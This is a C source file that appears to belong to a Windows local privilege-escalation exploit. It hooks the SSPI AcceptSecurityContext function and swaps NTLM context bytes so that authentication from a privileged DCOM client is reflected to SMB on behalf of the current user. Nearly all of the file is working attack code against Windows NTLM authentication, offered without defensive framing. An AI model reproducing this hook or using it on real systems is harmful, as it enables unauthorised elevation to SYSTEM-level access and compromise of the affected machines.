#define SECURITY_WIN32 
#pragma comment(lib, "Secur32.lib")

#include "Windows.h"
#include "stdio.h"
#include "sspi.h"
#include "DCOMReflection.h"

// global vars used also by SMBClient
HANDLE event1;
HANDLE event2;
HANDLE event3;
char SystemContext[8];
char UserContext[8];
BOOL ntlmType3Received;

SECURITY_STATUS AcceptSecurityContextHook(PCredHandle phCredential, PCtxtHandle phContext, PSecBufferDesc pInput, ULONG fContextReq, ULONG TargetDataRep, PCtxtHandle phNewContext, PSecBufferDesc pOutput, PULONG pfContextAttr, PTimeStamp ptsTimeStamp) {
	SECURITY_STATUS status;
	unsigned char* bufferPtr;
	if (ntlmType3Received) // we usually land here when the client want to alter the rpc context to perform the call with the integrity level. We want to avoid that.
		return SEC_E_INTERNAL_ERROR;
	if (pInput != NULL && pInput->cBuffers > 0) {
		for (unsigned long i = 0; i < pInput->cBuffers; i++) {
			bufferPtr = (unsigned char*)pInput->pBuffers[i].pvBuffer;
			if (bufferPtr[0] == 'N' && bufferPtr[1] == 'T' && bufferPtr[2] == 'L' && bufferPtr[3] == 'M') {
				if (bufferPtr[8] == 1) { // if the buffer is for ntlm type 1
					printf("[*] Received DCOM NTLM type 1 authentication from the privileged client\n");
				}
				if (bufferPtr[8] == 3) { // if the buffer is for ntlm type 3
					printf("[*] Received DCOM NTLM type 3 authentication from the privileged client\n");
					ntlmType3Received = TRUE;
				}
			}
		}
	}
	status = AcceptSecurityContext(phCredential, phContext, pInput, fContextReq, TargetDataRep, phNewContext, pOutput, pfContextAttr, ptsTimeStamp);
	if (ntlmType3Received)
		SetEvent(event3);
	else {
		// here we swap the 2 contexts for performing the DCOM to SMB reflection
		if (pOutput != NULL && pOutput->cBuffers > 0) {
			for (unsigned long i = 0; i < pOutput->cBuffers; i++) {
				bufferPtr = (unsigned char*)pOutput->pBuffers[i].pvBuffer;
				if (bufferPtr[0] == 'N' && bufferPtr[1] == 'T' && bufferPtr[2] == 'L' && bufferPtr[3] == 'M') {
					if (bufferPtr[8] == 2) { // if the buffer is for ntlm type 2
						memcpy(SystemContext, bufferPtr + NTLM_RESERVED_OFFSET, 8);
						SetEvent(event1);
						WaitForSingleObject(event2, INFINITE);
						// for local auth reflection we don't really need to relay the entire packet 
						// swapping the context in the Reserved bytes is enough
						memcpy(bufferPtr + NTLM_RESERVED_OFFSET, UserContext, 8);
						printf("[+] RPC Server Auth Context swapped with the Current User\n");
					}
				}
			}
		}
	}
	return status;
}

void HookSSPIForDCOMReflection() {
	event1 = CreateEvent(NULL, TRUE, FALSE, NULL);
	event2 = CreateEvent(NULL, TRUE, FALSE, NULL);
	event3 = CreateEvent(NULL, TRUE, FALSE, NULL);
	ntlmType3Received = FALSE;
	PSecurityFunctionTableW table = InitSecurityInterfaceW();
	table->AcceptSecurityContext = AcceptSecurityContextHook;
}